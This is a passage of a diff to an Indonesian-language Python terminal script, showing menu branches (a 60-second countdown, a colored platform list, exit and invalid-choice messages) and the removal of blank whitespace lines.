                 print(f"\n{Color.YELLOW}⏳ Jeda 60 detik...{Color.RESET}")
                 for i in range(60, 0, -1):
                     print(f"\r  {Color.YELLOW}⏳ {i:>3} detik...{Color.RESET}", end="")
@@ -2170,7 +2005,6 @@ def main():
             print(f"\n{Color.YELLOW}┌─ [!] Dihentikan{Color.RESET}")
             print(f"{Color.YELLOW}└────────────────────────────────────────────────────────────{Color.RESET}")
             sys.exit(0)
-    
     elif mode == "4":
         print(f"\n{Color.GOLD}┌────────────────────────────────────────────────────────────┐{Color.RESET}")
         print(f"{Color.GOLD}│  {Color.BOLD}{Color.WHITE}📋 LIST PLATFORM ({len(PLATFORMS)}){Color.RESET}{Color.GOLD}                          │{Color.RESET}")
@@ -2180,16 +2014,13 @@ def main():
             print(f"{Color.GOLD}│  {Color.GREEN}{i:>2}.{Color.RESET} {name:<16}  {icon} {fmt}{Color.GOLD}                             │{Color.RESET}")
         print(f"{Color.GOLD}└────────────────────────────────────────────────────────────┘{Color.RESET}")
         input(f"\n{Color.DIM}Enter untuk kembali...{Color.RESET}")
-    
     elif mode == "5":
         print(f"\n{Color.YELLOW}┌─ [!] Keluar{Color.RESET}")
         print(f"{Color.YELLOW}└────────────────────────────────────────────────────────────{Color.RESET}")
         sys.exit(0)
-    
     else:
         print(f"{Color.RED}┌─ [!] Pilihan tidak valid!{Color.RESET}")
         print(f"{Color.RED}└────────────────────────────────────────────────────────────{Color.RESET}")
-    
     print()
     input(f"{Color.DIM}Enter untuk kembali...{Color.RESET}")
 
